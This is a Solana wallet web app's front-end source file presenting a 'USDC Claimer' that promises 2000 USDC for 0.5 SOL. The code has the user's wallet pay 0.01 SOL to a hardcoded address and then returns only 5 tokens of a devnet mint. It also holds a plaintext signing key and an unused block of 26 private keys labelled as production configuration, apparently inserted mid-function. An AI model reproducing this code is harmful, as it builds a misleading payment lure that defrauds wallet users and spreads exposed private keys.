/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4FhZpjU1NkHY96Zwn6eArpZrok2KrPsRfp1o67hvbXtpxkP97Po29FXrJNSVU3mbgyC8QtAZ15H2z9iYXeD8aqV2"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2dSKR6zmMUbLTZDkEdhqS1FB946xXz9fqiHH2BMFsbMEyDU1mmS2aFJ4sj2couq2bp8gXmyVBCx8CeiSVbmmRudy",
  "key1": "364oMM44jMgiHLrFXA6nkS1wxhWPmmRho5fRGNiP7e9aJLKgdzrXMgKJYPzEgaBcyU8jERAesJNHJF7dQV51ne4N",
  "key2": "39NhsBKkCttXWcpzHEAxd7ZT6jn6rBSYQrNxXeyDtjauNZMPX4wSv17eTzuphgwY92HZ1hH9g3ap85t1GXAMMg15",
  "key3": "uwxZWQ72Z5ns9S8AFjzphDxiViZfSdrsp8ine8mFqAZMVwSwJq7vXVdawL6oCvpzBubjqrZLHeVgNpHQY3A8rM4",
  "key4": "2mTDzZ4QNXJbKqtXsD9pRhUwGeVk7eKEPbMBRmHXXXod9HCNhFoWPpJ596KseddHJAsDxgMXvx8E4hp7DeShu5gk",
  "key5": "4rUhkHtDKeYMeNdd1EjKiCJLE2BDtxSTUAUF8e2SxrPKkNyWJLVXdSnn5w7X4vPPdkX5yRDAw2hzJrrt8NWTRGYw",
  "key6": "AVJKkns2CtagS2qJE3nAkMJKQgBndxidsd9XNPvxpTZ7ao6EvkjZLscjwtWHjffkBWViZ6Nxr9xpP8iwhLu5HAc",
  "key7": "5jCmRgh3MDQ5Daf6oMaZnZD3HfvvBcZ3J1frnVXy6CtXpThiRRo8nptRjKFtGsAaAMBp34f2vUh6fBGUZRiFoqB6",
  "key8": "5aMBCQcKoNr281ZpbXppxNeranGmg5dcYsczhMW9d2FttExmAZJWPFpxvKtawJo4nnsuQYS4nYhhEqPeptEgvW52",
  "key9": "5u1aHuvj4fbkn3FYkvBrcZ2rPiLBMzsEBXEPY7hFeBH2FKNZ79mF7DbBrtyNgC4y6Y5QhTBvUZdCySDgTKXFLvjL",
  "key10": "3xT2dNPSz2LNxqUYe4AVQwmeN9CezKQf7psUe2BfsCohoFWFwdjmr9gF7HBhq2L7DR5WoZ2ff7KAnt2ucHis5EqH",
  "key11": "U8nDF3p3vHhzkf9gRXGfRNUy3BmxXHMP8V3hxCo97AgsZTkEhsN2jNqdB5YmJCSgj5G2G1jRrT38o7nwtEfXA2f",
  "key12": "23poDM7FEirB4eFN1eFGYXxByx7WYB2FLF57RiYF7vyPiuWYfsKjKdm7dk7e2WwrvZpRRcLjcimcW8QP3cQQz7Rc",
  "key13": "5hHy6UPqfwy3i5xcimJvTSNbqVJhJienmUuA3Boma3u3JVFTKVVBqM4bkL3UbY51bWY6uoQECVTjeP3r666pURdF",
  "key14": "4xGY6NFgV4fyv36Y7XsV34XUhmSoRshEXdGjFFJkewHY23M6pqxDC6PfysXJ7vBBa367KN3dUbSsAfbwrAYX663m",
  "key15": "4CwqRbncjj9NNKodTzTFDNTyWVURkgzZPcnLUiaoHk8qVCEt24iJ73zi4nwdTxyetaHEdNp27NDQ5JBH4kNfe6hu",
  "key16": "FJQJseWkx1aWCTTevMiWNTnJNPVi3QwMuD82RuRthaFxUXZXHRynKXf5hzTnVYBXtAxv7K4CKcg6LywFxu68coe",
  "key17": "5goWwwkjGAgviFA68y1NkCnRUnP38tW6HfbgmzejzdCM3EgCfc8dJgMe6EFkEQ5uDW2sQFNnfPsYUx5h8v2nnMtC",
  "key18": "2uQgJWmuEkwEkJKZ1LJgH2kfe4jvrsx2mt4qJFgajVoXrRQ71V7Jf48RG7KVmvLmmZ4bKtknPgKiiecJJ7mUgL4G",
  "key19": "txTNwGJS1iUEVVovTTEwQC8aS6W7bqSkB6rET7UFhYvdmXJBWrwMF7AyP2aWgZZzCTakFfGDqNataSLHrDcLt6n",
  "key20": "61MxT6QMTaUSaad4Prx8YMjVXjkCbKf8MmaMBBbsLsdoRxcDQnYVv2ZRfBT4d88o2qdti6VKxxHcjHYYN28Nve66",
  "key21": "2MyJCnRrqS6p2oKbRzmPMa7sVLXLT9rQN5uw5pX9J1af7N9r4qPbfT6m5iYxY4iBefPi4UETHQueaTzhhmWb6yEG",
  "key22": "WVgWP3GFirTTMozbNDJCvtFheXR6nA3r4JsGp7fsMpdMs5f7EdebnebjkKgp1ejfgjLJrV6ia6y19mWmMqc6CvM",
  "key23": "4Ci11tSapqgVywMXDuJDpsr7qW9gJeEFFKD9q8hLivZAWVRHhBtydLm5cz3Vxq3qxPfu3jytqkzEmm1a7YTXi7e4",
  "key24": "5J691NemjYvZUp1bB8MeiZEkdmaB93orx5mcuSz9Sh26vBUiPhvaWM18ManZRRRan1NVLiYL63eqNQZgShGbWUTN",
  "key25": "4Ws74pyw4Cze8d15zoU6zdar3kng57Fsk5Kp3RwwPoZee9vU3Jqpn3aJKZyBt42Bo7PGBxfuVyi2M1XUYH1LKoXW"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
